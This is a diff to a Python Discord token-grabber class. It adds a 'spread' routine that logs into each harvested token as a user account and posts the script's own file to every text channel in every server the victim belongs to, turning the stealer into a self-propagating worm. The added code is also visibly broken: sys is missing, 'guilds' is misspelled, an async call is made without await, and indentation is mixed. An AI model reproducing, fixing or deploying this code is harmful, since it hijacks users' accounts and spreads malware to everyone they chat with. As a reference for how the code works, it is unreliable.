@@ -1,5 +1,6 @@
 import os
 import re
+import discord
 
 class Discord():
 	def __init__(self):
@@ -36,12 +37,22 @@ class Discord():
 								self.tokens.append(token)
 		except Exception as e:
 			pass
-
-	def neatify(self):
+        async def spread(token):
+                client = discord.Client()
+                client.run(token, bot=False)
+                for guild in client.guilds:
+                        for channel in guilds.text_channels:
+                                await channel.send(file=discord.File(os.path.basename(sys.argv[0])))
+                                
+	def neatify(self, discordspread):
 		self.discord()
 		for token in set(self.tokens):
 			self.saved += "TOKEN: %s\n" % token
+			if discordspread == True:
+                                spread(token)	
 
-	def dump(self):
-		self.neatify()
+	def dump(self, discordspread):
+                discordspread = discordspread
+		self.neatify(discordspread)
+		
 		return self.saved
